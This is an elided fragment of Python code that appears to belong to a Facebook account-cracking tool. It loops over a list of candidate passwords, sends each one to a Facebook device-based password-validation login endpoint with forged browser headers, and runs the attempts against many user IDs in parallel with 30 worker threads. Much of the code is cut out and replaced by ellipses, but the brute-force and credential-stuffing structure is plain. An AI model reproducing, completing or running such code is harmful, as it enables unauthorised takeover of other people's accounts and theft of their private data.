        ...
        for pw in pasw:
            try:
                ...
                das = {
                    ...
                    "accept-encoding": "gzip; q=1.0, *;q=0.5, deflate br, identity, compress",
                ...
                xx = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data=dat, headers=das, allow_redirects=False)
            ...
            with Modol(max_workers=30) as bool:
                for i in self.id:
                    ...
                    if yan in ["", " "]:
                        ...
                        bool.submit(self.__metode__, uid, pwx, "web.facebook.com")
                    else:
